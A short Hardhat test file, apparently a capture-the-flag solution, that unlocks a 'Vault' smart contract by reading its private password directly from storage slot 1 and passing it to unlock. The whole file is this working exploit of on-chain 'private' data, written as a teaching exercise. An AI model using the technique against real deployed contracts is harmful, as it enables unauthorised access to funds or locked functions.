import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const Vault = await ethers.getContractFactory("Vault");
    const vault = await Vault.deploy(ethers.utils.zeroPad([42], 32));

    const password = await ethers.provider.getStorageAt(vault.address, 1);
    await vault.unlock(password);

    expect(await vault.locked()).to.be.false;
  })
})
